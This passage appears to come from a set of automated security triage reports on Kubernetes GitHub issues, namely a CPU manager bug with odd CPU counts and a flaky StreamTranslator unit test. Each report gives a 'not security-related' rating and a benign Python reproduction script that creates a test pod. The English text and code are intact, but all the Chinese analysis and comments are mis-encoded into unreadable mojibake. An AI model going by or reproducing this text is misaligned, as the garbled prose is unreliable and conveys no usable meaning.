    *   **ç»“æœåˆ¤æ–­**: æ ¹æ®Issueçš„æè¿°ï¼Œè¯¥è®¾å¤‡è·¯å¾„åº”è¯¥**ä¸å­˜åœ¨**ã€‚å¦‚æœè„šæœ¬æ‰§è¡Œå‘½ä»¤æ—¶æ”¶åˆ°â€œNo such file or directoryâ€ä¹‹ç±»çš„é”™è¯¯ï¼Œåˆ™è¯æ˜é—®é¢˜æˆåŠŸå¤ç°ã€‚è„šæœ¬ä¼šæ‰“å°å‡ºç›¸åº”çš„æˆåŠŸä¿¡æ¯ã€‚
    *   **Step 4: æ¸…ç†**: `cleanup`å‡½æ•°å°è£…åœ¨`finally`å—ä¸­ï¼Œç¡®ä¿æ— è®ºå¤ç°æ˜¯å¦æˆåŠŸæˆ–æ˜¯å¦å‡ºé”™ï¼Œè„šæœ¬éƒ½ä¼šå°è¯•åˆ é™¤ä¹‹å‰åˆ›å»ºçš„`Deployment`å’Œ`PVC`ï¼Œä¿æŒé›†ç¾¤ç¯å¢ƒçš„æ•´æ´ã€‚

3.  **è¶…æ—¶æœºåˆ¶**: è„šæœ¬åœ¨ç­‰å¾…Podå¯åŠ¨çš„ç¯èŠ‚åŒ…å«ä¸€ä¸ª120ç§’çš„è¶…æ—¶è®¾ç½®ï¼Œé˜²æ­¢å› é›†ç¾¤é—®é¢˜ï¼ˆå¦‚èµ„æºä¸è¶³ã€PVCæ— æ³•ç»‘å®šç­‰ï¼‰å¯¼è‡´è„šæœ¬æ— é™æœŸç­‰å¾…ã€‚

---


## Issue #131610 Does the cpu static policy option of PreferAlignByUncoreCache only support even CPU counts?

- Issue é“¾æ¥ï¼š[#131610](https://github.com/kubernetes/kubernetes/issues/131610)

### Issue å†…å®¹

#### What happened?

When I assign an odd number of CPUs and less than a full uncorecache, this policy cannot assign the cpu properly. I do not know if this option only support even number CPU by design or it is a bug.

For example, 1core:2cpus, cache0: 0-8 cpus. If I assign 7cpus in the pod spec, `takePartialUncore` cannot take any cpus.

The below method only assign even number CPU during SMT enabled scenario.

https://github.com/kubernetes/kubernetes/blob/2ac0bdf360cf2529a3675c7012d0bf415e1051f3/pkg/kubelet/cm/cpumanager/cpu_assignment.go#L558-L579
 


#### What did you expect to happen?

assign 7cpus in cache0.

#### How can we reproduce it (as minimally and precisely as possible)?

cache0: 0-8 cpus, SMT enabled. And then using  `takePartialUncore` to acquire 7 cpus, it will fail.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.32
</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨ç‰¹å®šé…ç½®ä¸‹Kubernetes CPUç®¡ç†å™¨æ— æ³•æ­£å¸¸å·¥ä½œçš„é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå½“Kubeletçš„CPUç®¡ç†å™¨ç­–ç•¥è¢«è®¾ç½®ä¸º`static`å¹¶ä¸”å¯ç”¨äº†`PreferAlignByUncoreCache`ç­–ç•¥é€‰é¡¹æ—¶ï¼Œå¦‚æœä¸€ä¸ªPodè¯·æ±‚å¥‡æ•°ä¸ªCPUï¼ˆä¸”æ•°é‡å°äºä¸€ä¸ªå®Œæ•´çš„uncore cacheï¼‰ï¼ŒCPUåˆ†é…ä¼šå¤±è´¥ã€‚

è¿™ä¸ªé—®é¢˜çš„æ ¸å¿ƒæ˜¯CPUèµ„æºåˆ†é…é€»è¾‘ä¸­çš„ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·ã€‚`takePartialUncore`å‡½æ•°åœ¨SMTï¼ˆåŒæ­¥å¤šçº¿ç¨‹ï¼‰å¯ç”¨çš„åœºæ™¯ä¸‹ï¼Œä¼¼ä¹è¢«è®¾è®¡ä¸ºåªèƒ½åˆ†é…å¶æ•°ä¸ªCPUï¼Œå¯¼è‡´å¥‡æ•°CPUçš„è¯·æ±‚æ— æ³•è¢«æ»¡è¶³ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
1.  **æ”»å‡»å‘é‡**ï¼šæ½œåœ¨çš„æ”»å‡»è€…æ˜¯é›†ç¾¤ä¸­ä¸€ä¸ªæœ‰æƒé™åˆ›å»ºPodçš„ç”¨æˆ·ã€‚
2.  **å½±å“**ï¼šå½±å“æ˜¯å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰ã€‚ç”¨æˆ·åˆ›å»ºçš„ã€ç¬¦åˆç‰¹å®šæ¡ä»¶çš„Podå°†æ— æ³•å¯åŠ¨ï¼Œå› ä¸ºå®ƒè¯·æ±‚çš„CPUèµ„æºæ— æ³•è¢«èŠ‚ç‚¹ä¸Šçš„KubeletæˆåŠŸåˆ†é…ã€‚
3.  **æ¼æ´æ€§è´¨**ï¼šè¿™æ˜¯ä¸€ç§â€œæ‹’ç»æœåŠ¡â€ï¼ˆDenial of Serviceï¼‰ï¼Œä½†å…¶å½±å“èŒƒå›´éå¸¸æœ‰é™ã€‚æ”»å‡»è€…åªèƒ½å¯¼è‡´è‡ªå·±åˆ›å»ºçš„Podæ— æ³•æ­£å¸¸è°ƒåº¦å’Œè¿è¡Œï¼Œè€Œæ— æ³•å½±å“åˆ°å…¶ä»–ç”¨æˆ·çš„Podã€èŠ‚ç‚¹ï¼ˆKubeletï¼‰çš„ç¨³å®šæ€§æˆ–æ•´ä¸ªé›†ç¾¤çš„è¿è¡Œã€‚è¿™ç§è¡Œä¸ºä¸ä¼šæ¶ˆè€—èŠ‚ç‚¹æˆ–é›†ç¾¤çš„é¢å¤–èµ„æºï¼Œä¹Ÿä¸ä¼šå¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚å®ƒæ›´åƒæ˜¯ä¸€ä¸ªé…ç½®é”™è¯¯æˆ–åŠŸèƒ½Bugï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨æ¥æ”»å‡»å…¶ä»–ç§Ÿæˆ·æˆ–åŸºç¡€è®¾æ–½çš„å®‰å…¨æ¼æ´ã€‚
4.  **é£é™©åˆ¤å®š**ï¼šæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬2æ¡å’Œç¬¬5æ¡ï¼Œè¯¥é—®é¢˜å±äºåŠŸèƒ½æ€§ç¼ºé™·ï¼Œå…¶é€ æˆçš„â€œæ‹’ç»æœåŠ¡â€æ˜¯é’ˆå¯¹è‡ªèº«æ“ä½œçš„ï¼Œå¹¶ä¸å¯¹å…¶ä»–ç”¨æˆ·æˆ–ç³»ç»ŸæœåŠ¡æ„æˆå¨èƒã€‚å› æ­¤ï¼Œå®ƒä¸è¢«å½’ç±»ä¸ºå®‰å…¨é£é™©ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueæ­ç¤ºçš„æ˜¯ä¸€ä¸ªåŠŸèƒ½Bugï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import sys
from kubernetes import client, config, watch

# ================================ é…ç½®è¯´æ˜ ================================
# å‰ææ¡ä»¶:
# 1. ä½ çš„Kubernetesé›†ç¾¤ä¸­è‡³å°‘æœ‰ä¸€ä¸ªå·¥ä½œèŠ‚ç‚¹æ»¡è¶³ä»¥ä¸‹æ‰€æœ‰æ¡ä»¶ï¼š
#    a. Kubeleté…ç½®äº†CPUé™æ€ç­–ç•¥: --cpu-manager-policy=static
#    b. Kubeleté…ç½®äº†ç­–ç•¥é€‰é¡¹: --cpu-manager-policy-options=PreferAlignByUncoreCache
#    c. èŠ‚ç‚¹å¼€å¯äº†SMTï¼ˆè¶…çº¿ç¨‹ï¼‰ã€‚
#    d. èŠ‚ç‚¹æœ‰è¶³å¤Ÿçš„ç©ºé—²CPUèµ„æºï¼ˆä¾‹å¦‚ï¼Œè‡³å°‘æœ‰8ä¸ªCPUåœ¨åŒä¸€ä¸ªuncore cacheä¸­ï¼‰ã€‚
#
# 2. ä¿®æ”¹ä¸‹é¢çš„ `TARGET_NODE_NAME` ä¸ºä½ é…ç½®å¥½çš„èŠ‚ç‚¹çš„å®é™…åç§°ã€‚
#
# 3. è„šæœ¬å°†å°è¯•åœ¨è¯¥èŠ‚ç‚¹ä¸Šåˆ›å»ºä¸€ä¸ªè¯·æ±‚7ä¸ªCPUçš„Podã€‚å¦‚æœèŠ‚ç‚¹é…ç½®æ­£ç¡®ï¼Œ
#    è¿™ä¸ªPodåº”è¯¥ä¼šå› ä¸ºCPUåˆ†é…å¤±è´¥è€Œæ— æ³•å¯åŠ¨ã€‚
# ========================================================================

TARGET_NODE_NAME = "your-preconfigured-node-name"  # <-- ã€é‡è¦ã€‘è¯·ä¿®æ”¹ä¸ºä½ çš„èŠ‚ç‚¹å
POD_NAME = "odd-cpu-test-pod"
NAMESPACE = "default"
TIMEOUT_SECONDS = 120 # è„šæœ¬æ‰§è¡Œè¶…æ—¶æ—¶é—´

def main():
    """
    ä¸»æ‰§è¡Œå‡½æ•°
    """
    if TARGET_NODE_NAME == "your-preconfigured-node-name":
        print("é”™è¯¯: è¯·åœ¨è¿è¡Œè„šæœ¬å‰ä¿®æ”¹ 'TARGET_NODE_NAME' å˜é‡ä¸ºä½ çš„ç›®æ ‡èŠ‚ç‚¹åç§°ã€‚")
        sys.exit(1)
        
    k8s_api = None
    try:
        # ä»é»˜è®¤è·¯å¾„ (~/.kube/config) åŠ è½½ Kubernetes é…ç½®
        config.load_kube_config()
        k8s_api = client.CoreV1Api()
        
        # æ£€æŸ¥ç›®æ ‡èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨
        print(f"INFO: æ­£åœ¨æ£€æŸ¥èŠ‚ç‚¹ '{TARGET_NODE_NAME}' æ˜¯å¦å­˜åœ¨...")
        try:
            k8s_api.read_node(name=TARGET_NODE_NAME)
            print(f"INFO: æˆåŠŸæ‰¾åˆ°ç›®æ ‡èŠ‚ç‚¹ '{TARGET_NODE_NAME}'ã€‚")
        except client.ApiException as e:
            if e.status == 404:
                print(f"é”™è¯¯: èŠ‚ç‚¹ '{TARGET_NODE_NAME}' æœªæ‰¾åˆ°ã€‚è¯·ç¡®ä¿èŠ‚ç‚¹åç§°æ­£ç¡®ä¸”é›†ç¾¤å¯è®¿é—®ã€‚")
                sys.exit(1)
            else:
                print(f"é”™è¯¯: æ— æ³•è¯»å–èŠ‚ç‚¹ä¿¡æ¯: {e}")
                sys.exit(1)

        # å®šä¹‰Podæ¸…å•ï¼Œè¯·æ±‚å¥‡æ•°ä¸ªCPUå¹¶æŒ‡å®šGuaranteed QoS
        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {"name": POD_NAME},
            "spec": {
                "containers": [
                    {
                        "name": "test-container",
                        "image": "registry.k8s.io/busybox",
                        "command": ["sh", "-c", "echo 'This pod should not start successfully'; sleep 3600"],
                        "resources": {
                            "requests": {"cpu": "7"},  # è¯·æ±‚å¥‡æ•°ä¸ªCPU
                            "limits": {"cpu": "7"}      # ä¿è¯Guaranteed QoSç­‰çº§
                        },
                    }
                ],
                "nodeName": TARGET_NODE_NAME,  # å°†Podå¼ºåˆ¶è°ƒåº¦åˆ°ç›®æ ‡èŠ‚ç‚¹
                "restartPolicy": "Never"
            },
        }

        print(f"INFO: æ­£åœ¨èŠ‚ç‚¹ '{TARGET_NODE_NAME}' ä¸Šåˆ›å»ºPod '{POD_NAME}'ï¼Œè¯·æ±‚7ä¸ªCPU...")
        k8s_api.create_namespaced_pod(body=pod_manifest, namespace=NAMESPACE)
        print(f"INFO: Pod '{POD_NAME}' åˆ›å»ºè¯·æ±‚å·²å‘é€ã€‚ç°åœ¨å¼€å§‹ç›‘è§†Podäº‹ä»¶...")

        # ç›‘è§†Podäº‹ä»¶ï¼ŒæŸ¥æ‰¾CPUç®¡ç†å™¨åˆ†é…å¤±è´¥çš„è¯æ®
        w = watch.Watch()
        start_time = time.time()
        reproduced = False

        for event in w.stream(k8s_api.list_namespaced_event,
                              namespace=NAMESPACE,
                              field_selector=f"involvedObject.kind=Pod,involvedObject.name={POD_NAME}",
                              timeout_seconds=TIMEOUT_SECONDS):
            
            event_obj = event['object']
            print(f"INFO: ç›‘å¬åˆ°äº‹ä»¶ - Reason: '{event_obj.reason}', Message: '{event_obj.message}'")

            # æ£€æŸ¥æ˜¯å¦æ˜¯CPUç®¡ç†å™¨å¯¼è‡´çš„å¤±è´¥äº‹ä»¶
            if (event_obj.reason == "Failed" and 
                "CPUManager" in event_obj.message and 
                ("failed to admit pod" in event_obj.message.lower() or "could not allocate" in event_obj.message.lower())):
                print("\nSUCCESS: æˆåŠŸå¤ç°é—®é¢˜ç—‡çŠ¶ï¼")
                print(f"æ£€æµ‹åˆ°å…³é”®å¤±è´¥äº‹ä»¶:\n  - Reason: {event_obj.reason}\n  - Message: {event_obj.message}")
                reproduced = True
                w.stop()
                break
        
        if not reproduced:
             # å¦‚æœäº‹ä»¶æµè¶…æ—¶ï¼Œå†æ£€æŸ¥ä¸€æ¬¡PodçŠ¶æ€
            pod_status = k8s_api.read_namespaced_pod_status(name=POD_NAME, namespace=NAMESPACE).status
            if pod_status.phase == 'Pending':
                 print(f"\nWARN: å¤ç°æœªå®Œå…¨ç¡®è®¤ï¼Œä½†Pod '{POD_NAME}' ä»å¤„äºPendingçŠ¶æ€ï¼Œè¿™å¯èƒ½æ˜¯é—®é¢˜å¯¼è‡´çš„ã€‚")
                 print("è¯·æ‰‹åŠ¨æ£€æŸ¥ `kubectl describe pod odd-cpu-test-pod` çš„äº‹ä»¶æ—¥å¿—ä»¥ç¡®è®¤å¤±è´¥åŸå› ã€‚")
            else:
                print(f"\nFAILURE: æœªèƒ½å¤ç°é—®é¢˜ã€‚PodçŠ¶æ€ä¸º '{pod_status.phase}'ã€‚")
                print("è¯·ä»”ç»†æ£€æŸ¥å‰ææ¡ä»¶æ˜¯å¦éƒ½å·²æ»¡è¶³ã€‚")

    except client.ApiException as e:
        # Podåˆ›å»ºå¤±è´¥ä¹Ÿå¯èƒ½æ˜¯å¤ç°æˆåŠŸçš„æ ‡å¿—
        if e.status == 400 and "forbidden" in e.body and "failed to admit pod" in e.body:
             print("\nSUCCESS: æˆåŠŸå¤ç°é—®é¢˜ç—‡çŠ¶ï¼")
             print(f"Podåˆ›å»ºè¢«æ‹’ç»ï¼Œè¿™ç¬¦åˆé¢„æœŸè¡Œä¸ºã€‚APIé”™è¯¯: {e.body}")
        else:
            print(f"å‘ç”ŸKubernetes APIé”™è¯¯: {e}")
    except Exception as e:
        print(f"å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
    finally:
        # æ¸…ç†èµ„æº
        print("\nINFO: å¼€å§‹æ¸…ç†èµ„æº...")
        if k8s_api:
            try:
                k8s_api.delete_namespaced_pod(name=POD_NAME, namespace=NAMESPACE, body=client.V1DeleteOptions())
                print(f"INFO: Pod '{POD_NAME}' å·²è¢«åˆ é™¤ã€‚")
            except client.ApiException as e:
                if e.status != 404:
                    print(f"WARN: åˆ é™¤Pod '{POD_NAME}' å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨æ¸…ç†ã€‚åŸå› : {e}")
            except Exception as e:
                print(f"WARN: æ¸…ç†è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}")

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬é€šè¿‡ä¸Kubernetes APIäº¤äº’ï¼Œæ¨¡æ‹Ÿç”¨æˆ·åˆ›å»ºä¸€ä¸ªè§¦å‘è¯¥åŠŸèƒ½ç¼ºé™·çš„Podï¼Œä»¥å¤ç°é—®é¢˜å¯¼è‡´çš„ç°è±¡ã€‚

**è„šæœ¬å·¥ä½œæµç¨‹:**
1.  **å‰ææ¡ä»¶æ£€æŸ¥**: è„šæœ¬é¦–å…ˆä¼šæç¤ºç”¨æˆ·ï¼Œå¿…é¡»åœ¨ä¸€ä¸ªé¢„å…ˆé…ç½®å¥½çš„KubernetesèŠ‚ç‚¹ä¸Šè¿è¡Œæ­¤æµ‹è¯•ã€‚è¯¥èŠ‚ç‚¹éœ€è¦å¯ç”¨`static` CPUç­–ç•¥å’Œ`PreferAlignByUncoreCache`é€‰é¡¹ã€‚ç”¨æˆ·å¿…é¡»å°†è„šæœ¬ä¸­çš„`TARGET_NODE_NAME`å˜é‡ä¿®æ”¹ä¸ºè¯¥èŠ‚ç‚¹çš„å®é™…åç§°ã€‚
2.  **è¿æ¥é›†ç¾¤**: è„šæœ¬ä½¿ç”¨`kubernetes` Pythonåº“åŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº`~/.kube/config`ï¼‰ï¼Œä»¥è·å¾—ä¸é›†ç¾¤äº¤äº’çš„æƒé™ã€‚
3.  **å®šä¹‰Pod**: è„šæœ¬æ„å»ºäº†ä¸€ä¸ªPodçš„å®šä¹‰ï¼ˆmanifestï¼‰ã€‚
    *   **è¯·æ±‚å¥‡æ•°CPU**: `resources.requests.cpu` å’Œ `resources.limits.cpu`éƒ½è¢«è®¾ç½®ä¸º`"7"`ã€‚è¯·æ±‚å¥‡æ•°ä¸ªCPUæ˜¯è§¦å‘æ­¤é—®é¢˜çš„å…³é”®ã€‚
    *   **Guaranteed QoS**: å°†`requests`å’Œ`limits`è®¾ç½®ä¸ºç›¸åŒçš„å€¼ï¼Œå¯ä»¥ç¡®ä¿Podçš„æœåŠ¡è´¨é‡ï¼ˆQoSï¼‰ç­‰çº§ä¸º`Guaranteed`ï¼Œè¿™æ˜¯`static` CPUç­–ç•¥ç”Ÿæ•ˆçš„å¿…è¦æ¡ä»¶ã€‚
    *   **èŠ‚ç‚¹äº²å’Œæ€§**: ä½¿ç”¨`nodeName`å­—æ®µå°†Podç›´æ¥è°ƒåº¦åˆ°å·²é…ç½®å¥½çš„ç›®æ ‡èŠ‚ç‚¹ä¸Šï¼Œç¡®ä¿æµ‹è¯•ç¯å¢ƒçš„å‡†ç¡®æ€§ã€‚
4.  **åˆ›å»ºå¹¶ç›‘è§†**: è„šæœ¬å‘Kubernetes APIå‘é€åˆ›å»ºPodçš„è¯·æ±‚ã€‚éšåï¼Œå®ƒä¼šå¯åŠ¨ä¸€ä¸ªç›‘è§†å™¨ï¼ˆ`watch`ï¼‰ï¼Œä¸“é—¨ç›‘å¬ä¸è¿™ä¸ªPodç›¸å…³çš„äº‹ä»¶ã€‚
5.  **ç»“æœåˆ¤æ–­**:
    *   **æˆåŠŸå¤ç°**: å¦‚æœç›‘è§†å™¨æ•è·åˆ°ä¸€ä¸ª`Reason`ä¸º`Failed`ä¸”`Message`ä¸­åŒ…å«`CPUManager`å…³é”®å­—çš„äº‹ä»¶ï¼Œè¯´æ˜Kubeletçš„CPUç®¡ç†å™¨ç¡®å®å› ä¸ºæ— æ³•åˆ†é…å¥‡æ•°ä¸ªCPUè€Œæ‹’ç»äº†Podçš„è°ƒåº¦ã€‚è„šæœ¬ä¼šæ‰“å°æˆåŠŸä¿¡æ¯å¹¶é€€å‡ºã€‚
    *   **æœªèƒ½å¤ç°**: å¦‚æœåœ¨è¶…æ—¶æ—¶é—´å†…ï¼ˆé»˜è®¤120ç§’ï¼‰æ²¡æœ‰æ•è·åˆ°é¢„æœŸçš„å¤±è´¥äº‹ä»¶ï¼Œè„šæœ¬ä¼šæ‰“å°è­¦å‘Šæˆ–å¤±è´¥ä¿¡æ¯ï¼Œå¹¶æç¤ºç”¨æˆ·æ‰‹åŠ¨æ£€æŸ¥èŠ‚ç‚¹é…ç½®å’ŒPodçŠ¶æ€ã€‚
6.  **èµ„æºæ¸…ç†**: æ— è®ºæµ‹è¯•æˆåŠŸä¸å¦ï¼Œ`finally`å—éƒ½ä¼šç¡®ä¿å°è¯•åˆ é™¤åˆ›å»ºçš„æµ‹è¯•Podï¼Œä»¥ä¿æŒé›†ç¾¤çš„æ•´æ´ã€‚

è¿™ä¸ªPoCè„šæœ¬å¹¶ä¸èƒ½ç›´æ¥è°ƒç”¨å­˜åœ¨é—®é¢˜çš„Goä»£ç ï¼Œä½†å®ƒèƒ½åœ¨çœŸå®çš„é›†ç¾¤ç¯å¢ƒä¸­é‡ç°è¯¥Bugæ‰€å¯¼è‡´çš„æœ€ç»ˆç”¨æˆ·å¯è§çš„ç°è±¡â€”â€”å³ç‰¹å®šç±»å‹çš„Podæ— æ³•è¢«æˆåŠŸè°ƒåº¦ã€‚

---


## Issue #131591 Failure cluster [07f9cb53...]: TestStreamTranslator_MultipleReadChannels

- Issue é“¾æ¥ï¼š[#131591](https://github.com/kubernetes/kubernetes/issues/131591)

### Issue å†…å®¹

#### Failure cluster [07f9cb534f24a0adccb1](https://go.k8s.io/triage#07f9cb534f24a0adccb1)

###### Error text:
```
Failed
=== RUN   TestStreamTranslator_MultipleReadChannels
    streamtranslator_test.go:473:  # HELP apiserver_stream_translator_requests_total [ALPHA] Total number of requests that were handled by the StreamTranslatorProxy, which processes streaming RemoteCommand/V5
         # TYPE apiserver_stream_translator_requests_total counter
         apiserver_stream_translator_requests_total{code="200"} 1
        -apiserver_stream_translator_requests_total{code="400"} 1
         
--- FAIL: TestStreamTranslator_MultipleReadChannels (0.23s)

```
##### Recent failures:
[4/25/2025, 7:07:16 PM ci-kubernetes-unit-1-33](https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-kubernetes-unit-1-33/1915814678374649856)


/kind failing-test
/kind flake
/sig api-machinery


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†ä¸€ä¸ªåœ¨Kubernetesé¡¹ç›®ä¸­åä¸º `TestStreamTranslator_MultipleReadChannels` çš„å•å…ƒæµ‹è¯•å¤±è´¥ã€‚

1.  **é—®é¢˜æ€§è´¨**: Issueçš„å†…å®¹æ˜¾ç¤ºè¿™æ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–æµ‹è¯•å¤±è´¥çš„æŠ¥å‘Šï¼Œå…·ä½“æ˜¯å•å…ƒæµ‹è¯• `TestStreamTranslator_MultipleReadChannels` å¤±è´¥ã€‚å¤±è´¥çš„åŸå› æ˜¯æ–­è¨€ä¸€ä¸ªPrometheusæŒ‡æ ‡ `apiserver_stream_translator_requests_total{code="400"} 1` æ—¶å‡ºç°äº†ä¸åŒ¹é…ã€‚è¿™ä¸ªæŒ‡æ ‡ç”¨äºç»Ÿè®¡é€šè¿‡ `StreamTranslatorProxy` å¤„ç†çš„è¯·æ±‚æ€»æ•°ã€‚
2.  **å…³è”åŠŸèƒ½**: æ ¹æ®æŒ‡æ ‡çš„æè¿°ï¼Œ`StreamTranslatorProxy` ç”¨äºå¤„ç†æµå¼ `RemoteCommand/V5`ï¼Œè¿™é€šå¸¸ä¸ `kubectl exec` å’Œ `kubectl attach` ç­‰åŠŸèƒ½ç›¸å…³ï¼Œå³åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤æˆ–é™„åŠ åˆ°æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚
3.  **å¤±è´¥åŸå› **: æµ‹è¯•çš„å¤±è´¥ç‚¹åœ¨äºï¼Œåœ¨æŸç§æµ‹è¯•åœºæ™¯ä¸‹ï¼ˆæ ¹æ®æµ‹è¯•åç§°ï¼Œå¯èƒ½æ˜¯æ¶‰åŠå¤šä¸ªè¯»å–é€šé“çš„åœºæ™¯ï¼‰ï¼Œä¸€ä¸ªæœ¬åº”äº§ç”ŸHTTP 400é”™è¯¯ç çš„è¯·æ±‚æ²¡æœ‰è¢«æ­£ç¡®åœ°ç»Ÿè®¡åˆ°æŒ‡æ ‡ä¸­ã€‚
4.  **å®‰å…¨é£é™©è¯„ä¼°**:
    *   æ­¤é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå…³äºæœåŠ¡å†…éƒ¨ç›‘æ§æŒ‡æ ‡ç»Ÿè®¡ä¸å‡†ç¡®çš„Bugï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªâ€œæµ‹è¯•æŠ–åŠ¨â€ï¼ˆFlaky Testï¼‰ã€‚
    *   å®ƒæ²¡æœ‰æè¿°ä»»ä½•å¯ä»¥è¢«åˆ©ç”¨çš„æ¼æ´ï¼Œä¾‹å¦‚æƒé™ç»•è¿‡ã€è¿œç¨‹ä»£ç æ‰§è¡Œã€ä¿¡æ¯æ³„éœ²æˆ–æ‹’ç»æœåŠ¡ã€‚`kubectl exec` åŠŸèƒ½æœ¬èº«æ˜¯å—Kubernetes RBACä¸¥æ ¼æ§åˆ¶çš„ï¼Œè€Œè¿™ä¸ªé—®é¢˜æ˜¯å…³äºæ‰§è¡Œåçš„æŒ‡æ ‡ç»Ÿè®¡ï¼Œè€Œä¸æ˜¯æ‰§è¡Œå‰çš„æƒé™æ£€æŸ¥ã€‚
    *   è¯¥é—®é¢˜ä¸æ¶‰åŠä»»ä½•å‡­è¯æ³„éœ²æˆ–ä¸å½“é…ç½®ã€‚
    *   å› æ­¤ï¼Œè¯¥Issueæè¿°çš„ç°è±¡æœ¬èº«ä¸æ„æˆä¸€ä¸ªå®‰å…¨é£é™©ã€‚å®ƒæ˜¯ä¸€ä¸ªè½¯ä»¶è´¨é‡å’Œå¯ç»´æŠ¤æ€§é—®é¢˜ï¼Œéœ€è¦å¼€å‘äººå‘˜ä¿®å¤æµ‹è¯•æˆ–è¢«æµ‹ä»£ç ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import kubernetes
from kubernetes import client, config, stream
import timeout_decorator

# æ­¤è„šæœ¬ä¸å¤ç°å®‰å…¨æ¼æ´ï¼Œå› ä¸ºåŸå§‹Issueä¸­æœªå‘ç°å®‰å…¨æ¼æ´ã€‚
# è„šæœ¬çš„ç›®çš„æ˜¯æ¼”ç¤ºä¸Issueç›¸å…³çš„æ ¸å¿ƒåŠŸèƒ½ï¼ˆPodå†…æ‰§è¡Œå‘½ä»¤çš„æµå¼APIï¼‰ï¼Œ
# ä»¥å¸®åŠ©ç†è§£Issueçš„ä¸Šä¸‹æ–‡ã€‚
# åŸå§‹Issueæ˜¯å…³äºAPIæœåŠ¡å™¨å†…éƒ¨æŒ‡æ ‡ç»Ÿè®¡çš„é”™è¯¯ï¼Œè¯¥è„šæœ¬æ— æ³•ä¹Ÿæ— éœ€å¤ç°è¯¥æŒ‡æ ‡é”™è¯¯ã€‚

# å®šä¹‰è¶…æ—¶æ—¶é—´ä¸º120ç§’
SCRIPT_TIMEOUT = 120

@timeout_decorator.timeout(SCRIPT_TIMEOUT, use_signals=False)
def main():
    """
    ä¸»å‡½æ•°ï¼Œæ¼”ç¤ºåœ¨Podä¸­æ‰§è¡Œå‘½ä»¤çš„æµç¨‹ã€‚
    """
    # å‡è®¾kubeconfigåœ¨é»˜è®¤ä½ç½®~/.kube/config
    # æˆ–è€…åœ¨Podå†…è¿è¡Œï¼Œä½¿ç”¨in-cluster config
    try:
        config.load_kube_config()
    except config.ConfigException:
        print("æ— æ³•åŠ è½½kubeconfigï¼Œå°è¯•ä½¿ç”¨in-cluster config")
        config.load_incluster_config()

    core_v1 = client.CoreV1Api()
    
    namespace = "default"
    pod_name = "poc-stream-test-pod"

    # 1. å®šä¹‰ä¸€ä¸ªPod
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": pod_name},
        "spec": {
            "containers": [
                {
                    "name": "busybox",
                    "image": "busybox",
                    "command": ["/bin/sh", "-c", "sleep 3600"],
                }
            ]
        },
    }

    print(f"åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­åˆ›å»ºPod '{pod_name}'...")
    try:
        # 2. åˆ›å»ºPod
        core_v1.create_namespaced_pod(body=pod_manifest, namespace=namespace)

        # 3. ç­‰å¾…Podè¿›å…¥RunningçŠ¶æ€
        print("ç­‰å¾…Podè¿›å…¥RunningçŠ¶æ€...")
        start_time = time.time()
        while time.time() - start_time < SCRIPT_TIMEOUT - 20: # ç•™å‡ºæ¸…ç†æ—¶é—´
            pod_status = core_v1.read_namespaced_pod_status(name=pod_name, namespace=namespace)
            if pod_status.status.phase == "Running":
                print("Podå·²æˆåŠŸå¯åŠ¨ã€‚")
                break
            time.sleep(2)
        else:
            raise Exception("ç­‰å¾…Podå¯åŠ¨è¶…æ—¶ã€‚")

        # 4. åœ¨Podä¸­æ‰§è¡Œå‘½ä»¤ (è¿™æ˜¯StreamTranslatorProxyå¤„ç†çš„åŠŸèƒ½)
        exec_command = ["echo", "Hello from inside the pod!"]
        
        print(f"åœ¨Podä¸­æ‰§è¡Œå‘½ä»¤: {' '.join(exec_command)}")

        # è°ƒç”¨stream API
        resp = stream.stream(
            core_v1.connect_get_namespaced_pod_exec,
            pod_name,
            namespace,
            command=exec_command,
            stderr=True,
            stdin=False,
            stdout=True,
            tty=False,
        )
        
        print(f"å‘½ä»¤æ‰§è¡Œç»“æœ: \n---\n{resp}\n---")
        
        # éªŒè¯è¾“å‡º
        if "Hello from inside the pod!" in resp:
